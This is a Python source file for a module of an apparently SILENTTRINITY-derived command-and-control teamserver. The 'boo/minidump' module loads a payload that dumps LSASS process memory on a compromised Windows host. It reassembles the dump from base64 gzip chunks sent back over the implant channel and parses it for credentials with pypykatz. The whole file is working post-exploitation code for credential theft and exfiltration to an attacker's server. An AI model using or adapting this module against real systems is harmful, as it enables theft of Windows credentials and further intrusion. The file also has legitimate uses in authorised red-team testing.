import gzip
import logging
import json
import os
from datetime import datetime
from base64 import b64decode
from urza.core.utils import get_path_in_package, get_path_in_data_folder
from urza.core.teamserver.module import Module
from pypykatz.pypykatz import pypykatz
from pypykatz.commons.common import UniversalEncoder


class STModule(Module):
    def __init__(self):
        self._new_dmp_file = True  # This sucks but its currently the only way to keep track if we want a new file

        self.name = 'boo/minidump'
        self.language = 'boo'
        self.description = 'Creates a memorydump of LSASS via the MiniDumpWriteDump Win32 API Call then downloads the dump and parses it for creds using Pypykatz'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Dumpfile': {
                'Description': 'The Path of the dumpfile',
                'Required': False,
                'Value': r"C:\WINDOWS\Temp\debug.bin"
            },
            'ProcessName': {
                'Description': 'Process name to dump',
                'Required': False,
                'Value': "lsass"
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/minidump.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('DUMPFILE_PATH', self.options['Dumpfile']['Value'])
            src = src.replace('PROCESS_NAME', self.options['ProcessName']['Value'])
            return src

    def process(self, context, output):
        try:
            # Create file paths for the first chunk
            if self._new_dmp_file:
                self._new_dmp_file = False
                timestamp = datetime.now().strftime('%Y_%m_%d_%H%M%S')
                base_path = os.path.join(get_path_in_data_folder("logs"), context.session.guid)
                self.gzip_file = f"{base_path}/minidump_{timestamp}.gz"
                self.decompressed_file = f"{base_path}/minidump_{timestamp}.bin"
                os.makedirs(base_path, exist_ok=True)

            # Write chunk to gzip file
            file_chunk = output.get('data', None)
            if file_chunk:
                with open(self.gzip_file, 'ab') as reassembled_gzip_file:
                    reassembled_gzip_file.write(b64decode(file_chunk))
            else:
                logging.error("No data found in output.")
                return "Invalid chunk data."

            # Process the final chunk
            if output['current_chunk_n'] == (output['chunk_n'] + 1):
                try:
                    # Decompress gzip file
                    with open(self.decompressed_file, 'wb') as reassembled_file:
                        with gzip.open(self.gzip_file, 'rb') as compressed_mem_dump:
                            reassembled_file.write(compressed_mem_dump.read())

                    # Parse memory dump
                    results = pypykatz.parse_minidump_file(self.decompressed_file)
                    self._new_dmp_file = True
                    return json.dumps(results, cls=UniversalEncoder, indent=4, sort_keys=True)

                except Exception as e:
                    logging.error(f"Error during final chunk processing: {e}", exc_info=True)
                    return "Error during memory dump processing."
            else:
                return f"Processed chunk {output['current_chunk_n']}/{output['chunk_n'] + 1}"

        except Exception as e:
            logging.error(f"Unexpected error in processing: {e}", exc_info=True)
            return "An unexpected error occurred."

